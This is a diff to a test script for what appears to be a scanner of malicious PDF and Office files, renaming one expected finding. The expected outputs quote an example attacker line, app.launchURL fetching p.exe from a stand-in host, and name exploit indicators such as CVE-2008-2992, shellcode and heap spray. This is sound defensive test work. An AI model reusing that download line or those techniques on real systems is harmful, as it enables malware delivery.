@@ -44,7 +44,7 @@ check() { # file, expected verdict, [required substring... | @norender]
 NONE="NO ACTIVE BEHAVIOUR OBSERVED"
 check testdata/clean.pdf "$NONE"
 check testdata/text.pdf "$NONE"
-check testdata/evil.pdf "MALICIOUS BEHAVIOUR" "app.launchURL(http://evil-cdn.example/p.exe)" "hex-escaped names"
+check testdata/evil.pdf "MALICIOUS BEHAVIOUR" "app.launchURL(http://evil-cdn.example/p.exe)" "hex-escaped keywords"
 check testdata/evil2.pdf "MALICIOUS BEHAVIOUR" "CVE-2008-2992" "shellcode pattern" "heap spray" "nLaunch=2" "gate.php"
 check testdata/office/harmless-clean.docx "$NONE"
 check testdata/office/harmless-clean.doc "$NONE"
